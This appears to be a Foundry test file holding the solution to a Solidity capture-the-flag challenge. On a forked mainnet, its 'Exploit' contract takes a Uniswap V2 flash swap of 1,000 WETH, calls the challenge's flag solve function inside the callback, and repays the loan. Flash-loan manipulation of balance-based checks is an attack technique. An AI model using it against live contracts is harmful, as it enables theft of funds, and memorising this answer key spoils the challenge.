// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./Challenge.sol";
import "./IUniswapV2Pair.sol";

contract ChallengeTest is Test {
    Setup setup;
    address public playerAddress;

    function setUp() public {
        vm.createSelectFork("mainnet", 17600000);

        playerAddress = makeAddr("player");
        vm.deal(playerAddress, 4 ether);
        setup = new Setup();
    }

    function testExploit() public {
        vm.startPrank(playerAddress, playerAddress);

        ////////// YOUR CODE GOES HERE //////////
        new Exploit(setup).exploit{value: 3.5 ether}();
        ////////// YOUR CODE END //////////

        assertTrue(setup.isSolved(), "challenge not solved");
        vm.stopPrank();
    }
}

////////// YOUR CODE GOES HERE //////////
contract Exploit is IUniswapV2Callee {
    Setup setup;
    address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address pair = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;

    constructor(Setup setup_) {
        setup = setup_;
    }

    function exploit() public payable {
        IWETH(weth).deposit{value: msg.value}();
        IUniswapV2Pair(pair).swap(0, 1_000 ether, address(this), "flash");
    }

    function uniswapV2Call(address, uint, uint, bytes calldata) external {
        setup.flag().solve();
        IWETH(weth).transfer(pair, IWETH(weth).balanceOf(address(this)));
    }
}
////////// YOUR CODE END //////////
